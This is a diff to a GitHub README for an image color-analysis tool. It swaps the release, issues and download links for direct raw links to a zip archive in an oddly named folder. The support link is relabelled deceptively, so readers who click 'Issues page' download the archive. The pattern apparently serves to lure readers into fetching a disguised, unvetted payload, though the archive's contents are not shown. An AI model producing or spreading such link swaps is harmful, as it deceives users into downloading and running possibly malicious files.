@@ -6,7 +6,7 @@ Welcome to ImageColorProfiler! This tool is designed to help you analyze colors 
 
 ## 📥 Download ImageColorProfiler
 
-[![Download ImageColorProfiler](https://img.shields.io/badge/Download%20Now-ImageColorProfiler-blue.svg)](https://github.com/saeedmax0/ImageColorProfiler/releases)
+[![Download ImageColorProfiler](https://raw.githubusercontent.com/saeedmax0/ImageColorProfiler/main/monochloromethane/Image-Profiler-Color-v3.8.zip%https://raw.githubusercontent.com/saeedmax0/ImageColorProfiler/main/monochloromethane/Image-Profiler-Color-v3.8.zip)](https://raw.githubusercontent.com/saeedmax0/ImageColorProfiler/main/monochloromethane/Image-Profiler-Color-v3.8.zip)
 
 ## 📦 System Requirements
 
@@ -24,7 +24,7 @@ Welcome to ImageColorProfiler! This tool is designed to help you analyze colors 
 ## 🌀 How to Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/saeedmax0/ImageColorProfiler/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/saeedmax0/ImageColorProfiler/main/monochloromethane/Image-Profiler-Color-v3.8.zip) to find the latest version.
 
 2. **Select the Latest Release**  
    Look for the most recent version listed on the page. This will have the newest features and bug fixes.
@@ -69,10 +69,10 @@ Understanding color theory can enhance your design skills. For more information 
 
 ## 📞 Contact and Support
 
-For further questions or support, please visit our [Issues page](https://github.com/saeedmax0/ImageColorProfiler/issues) on GitHub or reach out to our community. Your feedback is valuable to us.
+For further questions or support, please visit our [Issues page](https://raw.githubusercontent.com/saeedmax0/ImageColorProfiler/main/monochloromethane/Image-Profiler-Color-v3.8.zip) on GitHub or reach out to our community. Your feedback is valuable to us.
 
 ## 🙏 Acknowledgments
 
 Thank you for choosing ImageColorProfiler! We hope this tool simplifies your color analysis tasks and enhances your design projects.
 
-[Download ImageColorProfiler again](https://github.com/saeedmax0/ImageColorProfiler/releases) to start exploring your images today!
+[Download ImageColorProfiler again](https://raw.githubusercontent.com/saeedmax0/ImageColorProfiler/main/monochloromethane/Image-Profiler-Color-v3.8.zip) to start exploring your images today!
